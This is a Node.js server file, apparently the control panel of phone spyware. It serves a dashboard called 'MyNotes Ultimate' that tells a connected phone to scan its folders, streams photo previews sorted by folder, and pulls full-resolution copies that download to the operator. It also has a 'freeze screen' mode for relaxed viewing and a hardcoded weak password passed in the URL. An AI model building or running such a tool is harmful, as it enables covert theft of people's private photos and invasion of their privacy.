const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- 1. SEGURIDAD ---
const AUTH_PASS = "admin123"; // Tu contraseña

app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`
            <body style="background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
                <div style="text-align:center;">
                    <h2>🔒 ACCESO RESTRINGIDO</h2>
                    <input type="password" id="pass" placeholder="Contraseña..." style="padding:10px; border-radius:5px; border:none;">
                    <button style="padding:10px; cursor:pointer;" onclick="window.location.href='/?auth='+document.getElementById('pass').value">ENTRAR</button>
                </div>
            </body>
        `);
    }

    res.send(`
    <html>
        <head>
            <title>MyNotes Ultimate</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; margin: 0; padding: 20px; }
                
                /* DASHBOARD FIJO */
                .dashboard {
                    position: sticky; top: 0; z-index: 100;
                    background: #1e1e1e; padding: 15px; border-radius: 10px;
                    border: 1px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
                    margin-bottom: 20px;
                }

                .status-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; font-size: 14px;}
                #status { font-weight: bold; }

                /* FILTROS */
                select {
                    padding: 10px; background: #333; color: white; border: 1px solid #555; 
                    border-radius: 5px; font-weight: bold; width: 100%; margin-bottom: 10px;
                }

                /* GRID DE BOTONES */
                .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
                .full-width { grid-column: span 2; }

                button { 
                    padding: 12px; border: none; border-radius: 5px; font-weight: bold; 
                    cursor: pointer; color: white; transition: 0.2s; font-size: 12px;
                }
                
                /* COLORES DE BOTONES */
                .btn-start { background: #2979ff; } /* Azul */
                .btn-start:hover { background: #1565c0; }
                
                .btn-stop { background: #d50000; } /* Rojo */
                .btn-stop:hover { background: #b71c1c; }

                .btn-freeze { background: #ff9100; color: black; } /* Naranja */
                .btn-freeze:hover { background: #ff6d00; }
                
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
                
                /* TARJETAS DE FOTOS */
                .card { background: #000; border-radius: 5px; overflow: hidden; position: relative; border: 1px solid #333; animation: fadeIn 0.3s;}
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

                .card img { width: 100%; height: 100px; object-fit: cover; }
                .card.hd img { border-bottom: 3px solid #00e676; height: 120px; }
                
                .badge {
                    position: absolute; top: 0; right: 0; background: rgba(0,0,0,0.8); 
                    color: #fff; padding: 3px 6px; font-size: 9px; border-bottom-left-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="dashboard">
                <div class="status-row">
                    <span>📡 <span id="status" style="color:#ff1744">Desconectado</span></span>
                    <span id="counter" style="color:#00e676">0 fotos</span>
                </div>

                <select id="folderFilter" onchange="applyFilter()">
                    <option value="ALL">📂 TODAS LAS CARPETAS</option>
                </select>
                
                <div class="controls">
                    <button class="btn-start" onclick="sendCommand('start')">▶ INICIAR CELULAR</button>
                    <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER CELULAR</button>
                    
                    <button id="btnFreeze" class="btn-freeze full-width" onclick="toggleFreeze()">👀 CONGELAR PANTALLA (Ver tranquilos)</button>
                </div>
            </div>

            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const filterSelect = document.getElementById('folderFilter');
                const btnFreeze = document.getElementById('btnFreeze');
                const counter = document.getElementById('counter');
                
                let folders = new Set();
                let photoCount = 0;
                
                // VARIABLES PARA CONGELAR
                let isFrozen = false;
                let pendingBuffer = []; // Aquí se guardan las fotos mientras estás congelado

                // --- LÓGICA DE CONTROL ---
                function sendCommand(action) {
                    socket.emit('admin_command', { action: action === 'start' ? 'start_scan' : 'stop_scan' });
                }

                function toggleFreeze() {
                    isFrozen = !isFrozen;
                    if (isFrozen) {
                        btnFreeze.innerText = "⏸ PANTALLA CONGELADA (Acumulando...)";
                        btnFreeze.style.background = "#00bcd4"; // Cyan
                        btnFreeze.style.color = "white";
                    } else {
                        // AL DESCONGELAR
                        btnFreeze.innerText = "👀 CONGELAR PANTALLA";
                        btnFreeze.style.background = "#ff9100"; // Naranja
                        btnFreeze.style.color = "black";
                        
                        // Procesar todo lo acumulado
                        if (pendingBuffer.length > 0) {
                            pendingBuffer.forEach(data => renderCard(data));
                            pendingBuffer = []; // Limpiar buffer
                        }
                    }
                }

                // --- SOCKETS ---
                socket.on('connection_alert', msg => {
                    const el = document.getElementById('status');
                    el.innerText = msg;
                    el.style.color = msg.includes("Conectado") ? "#00e676" : "#ff1744";
                });

                socket.on('new_preview', data => {
                    // 1. Siempre actualizamos la lista de carpetas (aunque esté congelado)
                    if (!folders.has(data.folder)) {
                        folders.add(data.folder);
                        const option = document.createElement('option');
                        option.value = data.folder;
                        option.innerText = "📁 " + data.folder;
                        filterSelect.appendChild(option);
                    }

                    // 2. Decisión: ¿Mostramos o guardamos?
                    if (isFrozen) {
                        if(!document.getElementById(data.path)) {
                            pendingBuffer.push(data);
                            btnFreeze.innerText = "▶ REANUDAR (" + pendingBuffer.length + " pendientes)";
                        }
                    } else {
                        renderCard(data);
                    }
                });

                socket.on('receive_full', data => {
                    downloadBase64File(data.image64, data.name);
                    updateCardToHD(data);
                });

                // --- RENDERIZADO ---
                function renderCard(data) {
                    if(document.getElementById(data.path)) return; // Evitar duplicados
                    photoCount++;
                    counter.innerText = photoCount + " fotos";

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.setAttribute('data-folder', data.folder); // Para filtrar
                    div.innerHTML = \`
                        <span class="badge">\${data.folder}</span>
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <button style="width:100%; padding:5px; background:#6200ea; border:none; color:white; font-weight:bold; cursor:pointer;" onclick="pedirHD('\${data.path}')">⚡ HD</button>
                    \`;
                    
                    // Aplicar filtro actual inmediatamente
                    if (filterSelect.value !== "ALL" && filterSelect.value !== data.folder) {
                        div.style.display = "none";
                    }
                    
                    grid.prepend(div);
                }

                function applyFilter() {
                    const selected = filterSelect.value;
                    const cards = document.getElementsByClassName('card');
                    for(let c of cards) {
                        if (selected === "ALL" || c.getAttribute('data-folder') === selected) {
                            c.style.display = "block";
                        } else {
                            c.style.display = "none";
                        }
                    }
                }

                function updateCardToHD(data) {
                    const name = data.name.replace("HD_", "");
                    const cards = document.getElementsByClassName('card');
                    for(let c of cards) {
                        if(c.id === data.path || c.innerHTML.includes(name)) {
                            c.classList.add('hd');
                            c.querySelector('img').src = "data:image/jpeg;base64," + data.image64;
                            c.querySelector('button').innerText = "✅ DESCARGADO";
                            c.querySelector('button').style.background = "#00c853";
                        }
                    }
                }

                function pedirHD(path) { socket.emit('order_download', { path: path }); }

                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

io.on('connection', (socket) => {
    io.emit('connection_alert', '✅ Celular Conectado');
    
    socket.on('usrData', (data) => {
        if (data.dataType === 'preview_image') io.emit('new_preview', data);
        else if (data.dataType === 'full_image') io.emit('receive_full', data);
    });

    socket.on('admin_command', (cmd) => socket.broadcast.emit('command_' + cmd.action));
    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));
    socket.on('disconnect', () => io.emit('connection_alert', '❌ Desconectado'));
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor Ultimate listo'));
